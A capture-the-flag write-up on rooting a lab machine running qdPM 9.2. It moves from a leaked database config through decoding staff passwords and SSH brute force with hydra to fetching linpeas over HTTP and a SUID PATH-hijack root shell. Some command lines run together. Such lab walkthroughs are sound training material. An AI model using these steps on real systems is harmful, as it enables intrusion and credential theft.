## Initial Reconnaissance  

To begin, I scanned the network to identify the target machine's IP address:

```bash
ip neigh

# Alternatively, we can use: 
sudo arp-scan -l
```

![ip](./assets/ip.png)

The discovered IP address was 192.168.57.6.

Next, I conducted an nmap scan to enumerate open ports. The scan revealed three open ports: 22 (SSH), 80 (HTTP), and 3306 (MySQL).

![port](./assets/port.png)

---

## Enumeration  

Accessing the web server on port 80, I encountered a login screen. At the bottom of the login section, the CMS version was displayed as qdPM 9.2.

![webpage](./assets/webpage.png)

Using searchsploit, I checked for known exploits for qdPM 9.2 and found an exploit related to password exposure.

![searchsploit](./assets/searchsploit.png)

To review the exploit details, I extracted it with:

```bash
searchsploit -x php/webapps/50176.txt
```

![exploit](./assets/exploit.png)

The exploit directed me to a URL where the database credentials were exposed at: `http://<website>/core/config/databases.yml`

Visiting this URL confirmed the presence of the database configuration file containing plaintext credentials.

![creds](./assets/creds.png)

The captured credentials were as follows:

```text
db_username=qdpmadmin
db_name=qdpm   
host=localhost (192.168.57.6)   
port=3306   
password=UcVQCMQk2STVeS6J
```

Using the obtained credentials, I connected to the MySQL database:

```bash
mysql -h 192.168.57.6 -u qdpmadmin -p   
# Password: UcVQCMQk2STVeS6J`
```

![mysql](./assets/mysql.png)

Listing the databases showed two unique databases: qdpm and staff.

The qdpm database contained no relevant information, but the staff database included two tables of interest: user and login.

```sql
SHOW DATABASES;   
USE staff;   
SHOW TABLES;   
SELECT * FROM user;   
SELECT * FROM login;
```

Examining the tables, the user table held usernames, while the login table contained base64-encoded passwords. Importantly, the passwords were not logically aligned with their users but linked via their IDs.

To correlate passwords with users, I matched the id from the user table to the user_id in the login table.

![users](./assets/users.png)

![passwords](./assets/passwords.png)

After sorting, the credentials appeared as:

```text
smith = WDdNUWtQM1cyOWZld0hkQw==   
lucas = c3VSSkFkR3dMcDhkeTNyRg==   
travis = REpjZVlyOThXMjhZN3dMZw==   
dexter = N1p3VjRxdGc0MmNtVVhHWA==   
meyer = Y3FObkJXQ0J5UzJEdUpTeQ==
```

To decode the passwords, I used the base64 command:

```bash
echo "<encoded_passwd>" | base64 -d
```

Resulting in cleartext passwords:

```text
smith = X7MQkP3W29fewHdC   
lucas = suRJAdGwLp8dy3rF   
travis = DJceVy98W28Y7wLg   
dexter = 7ZwV4qtg42cmUXGX   
meyer = cqNnBWCByS2DuJSy
```

---

## Exploitation 

Given port 22 was open, I manually attempted SSH logins with the usernames and their decoded passwords. Only Travis and Dexter could successfully authenticate.

Alternatively, I automated this process using Hydra. I saved usernames in users.txt and passwords in passwd_cracked.txt, then ran:

```bash
hydra -L users.txt -P passwd_cracked.txt ssh://192.168.57.6
```

Hydra confirmed the credentials for Travis.

![hydra](./assets/hydra.png)

I logged in as Travis:

```bash
ssh travis@192.168.57.6 
# Password: DJceVy98W28Y7wLg
```

![travis](./assets/travis.png)

Inside Travis' account, I found the user.txt file containing the flag:

```text
ICA{Secret_Project}
```


Running linpeas yielded no further privilege escalation insights from this user.

To upload linpeas:

```bash
# From local machine, run a Python HTTP server:   
python3 -m http.server 8000 

# On target machine, navigate to /tmp and download linpeas:   
wget http://<vboxnet>:8000/linpeas.sh   
# Make linpeas executable:   
chmod +x linpeas.sh
```

---

## Initial Shell  

Next, I logged into Dexter's account:

```bash
ssh dexter@192.168.57.6   
# Password: 7ZwV4qtg42cmUXGX
```

![dexter](./assets/dexter.png)
Inside Dexter's home directory, I found a note referencing a potentially vulnerable executable. This became my next focus.

Running linpeas again, I located the binary in question.

![binary](./assets/binary.png)

Attempting to run it directly resulted in a permission error.

![get_access](./assets/get_access.png)

---

## Privilege Escalation  

Using strings analysis on the binary:

```bash
strings get_access
```

The output revealed the binary executed the cat command to read files accessible only by root.

![strings](./assets/strings.png)

Because the binary called cat by relative path (/usr/bin/cat), I attempted a Relative Path Hijacking attack on this SUID program.

The steps were:

Navigate to /tmp:

```bash
cd /tmp
```

Create a file named cat:

```bash
touch cat
```

Add a command to spawn a root shell:

```bash
echo "/bin/bash" > cat
```

Update the PATH environment variable to include /tmp first:

```bash
echo $PATH   export PATH=/tmp:$PATH
```

Confirm /tmp is first in PATH:

```bash
echo $PATH
```

Make the custom cat executable and run the vulnerable binary:

```bash
chmod +x cat   /opt/get_access
```

![path-hijacking](./assets/path-hijacking.png)

The shell spawned had root privileges. Since the original cat was replaced, I used more to view the root-only file.

![root](./assets/root.png)

The root-only file contained the flag:

```text
ICA{Next_Generation_Self_Renewable_Genetics}
```

To restore the PATH variable and fix the cat command functionality:

```bash
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:$PATH
```
 
This corrected the issue.

![correction](./assets/correction.png)